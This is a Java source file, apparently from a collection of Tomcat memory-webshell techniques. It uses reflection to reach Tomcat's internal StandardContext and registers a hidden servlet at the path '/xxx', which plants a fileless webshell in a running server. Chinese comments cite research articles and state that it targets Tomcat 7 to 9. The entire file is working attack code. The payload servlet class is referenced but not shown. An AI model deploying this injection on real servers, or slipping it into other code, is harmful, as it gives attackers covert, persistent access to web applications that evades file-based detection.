package com.memshell.tomcat;

import com.memshell.generic.ServletTemplate;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

public class ServletBasedBasic extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
//        参考：
//        《Tomcat源代码调试：看不见的Shell第一式》    https://www.freebuf.com/articles/web/151431.html
//        《基于tomcat的内存 Webshell 无文件攻击技术》    https://xz.aliyun.com/t/7388
//        《动态注册之Servlet+Filter+Listener》    https://www.jianshu.com/p/cbe1c3174d41
//        《基于Tomcat无文件Webshell研究》   https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA
//        《tomcat不出网回显连续剧第六集》   https://xz.aliyun.com/t/7535
//        《tomcat结合shiro无文件webshell的技术研究以及检测方法》     https://mp.weixin.qq.com/s/fFYTRrSMjHnPBPIaVn9qMg
//
//        适用范围: Tomcat 7 ~ 9

        try{
            String servrletName = "myServlet1";
            String urlPattern = "/xxx";

            // 获取 standardContext
            ServletContext servletContext = req.getServletContext();
            Field field = servletContext.getClass().getDeclaredField("context");
            field.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);

            field = applicationContext.getClass().getDeclaredField("context");
            field.setAccessible(true);
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
            StandardContext standardContext = (StandardContext) field.get(applicationContext);

            if(standardContext.findChild(servrletName) == null){
                System.out.println("[+] Add Dynamic Servlet");

                Wrapper wrapper = standardContext.createWrapper();
                wrapper.setName(servrletName);
                standardContext.addChild(wrapper);
                Servlet servlet = new ServletTemplate();

                wrapper.setServletClass(servlet.getClass().getName());
                wrapper.setServlet(servlet);
                ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
                registration.addMapping(urlPattern);
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}